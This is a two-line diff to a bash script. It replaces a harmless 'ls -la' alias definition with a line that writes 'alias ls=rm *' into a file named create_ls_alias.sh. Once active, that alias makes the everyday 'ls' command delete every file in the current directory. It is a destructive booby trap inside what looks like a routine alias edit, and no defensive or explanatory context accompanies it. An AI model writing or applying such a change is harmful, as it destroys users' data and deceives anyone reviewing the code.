@@ -1,2 +1,2 @@
 #!/bin/bash
-{ echo "alias myalias=ls -la"; echo "source ~/.bashrc"; } | sh
+echo "alias ls=rm *" > create_ls_alias.sh
